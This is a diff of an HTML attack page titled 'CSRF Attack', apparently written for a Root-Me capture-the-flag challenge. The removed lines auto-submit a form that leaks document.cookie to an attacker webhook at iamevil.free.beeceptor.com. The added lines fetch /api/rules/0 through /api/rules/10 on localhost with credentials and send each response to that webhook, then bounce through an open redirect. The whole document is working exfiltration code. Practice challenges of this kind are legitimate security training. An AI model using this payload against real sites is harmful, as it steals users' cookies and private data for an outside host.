@@ -3,18 +3,26 @@
 <head>
     <title>CSRF Attack</title>
 </head>
-<body onload="document.forms[0].submit()">
-    <form action="http://challenge01.root-me.org:58039/redirect" method="GET">
-        <input type="hidden" name="url" value="https://iamevil.free.beeceptor.com/form_cookies?data=COOKIES_HERE">
-    </form>
+<body>
     <script>
-        // Try to update the form value with actual cookies
-        document.forms[0].elements[0].value = document.forms[0].elements[0].value.replace('COOKIES_HERE', encodeURIComponent(document.cookie));
+        // Try all possible rule IDs including potential hidden ones
+        for (var i = 0; i <= 10; i++) {
+            fetch('http://127.0.0.1:58039/api/rules/' + i, {
+                credentials: 'include'
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Send each rule's content to our server
+                fetch('https://iamevil.free.beeceptor.com/rule?id=' + i + '&content=' + encodeURIComponent(data))
+                .catch(() => {}); // Ignore fetch errors to webhook
+            })
+            .catch(() => {}); // Ignore rule fetch errors
+        }
         
-        // Fallback redirect
+        // Ensure redirect happens regardless
         setTimeout(function() {
-            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/form_timeout';
-        }, 1000);
+            window.location = 'http://challenge01.root-me.org:58039/redirect?url=https://iamevil.free.beeceptor.com/tried_all_rules';
+        }, 2000);
     </script>
 </body>
 </html>
